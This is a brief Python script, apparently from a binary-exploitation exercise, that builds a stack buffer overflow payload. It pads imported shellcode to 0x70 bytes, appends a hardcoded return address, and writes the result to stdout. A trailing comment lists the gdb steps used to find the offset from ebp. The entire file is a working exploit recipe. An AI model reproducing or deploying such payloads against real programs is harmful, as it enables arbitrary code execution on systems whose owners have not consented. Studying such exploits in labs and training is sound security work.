from shellcode import shellcode
import sys

execute = shellcode + b'0' * (0x70 - len(shellcode)) + (0xfff6cbfc).to_bytes(4, 'little')
sys.stdout.buffer.write(execute)


# b vulnerable -> run AAAAAAA -> info register ebp -> ebp-0x6c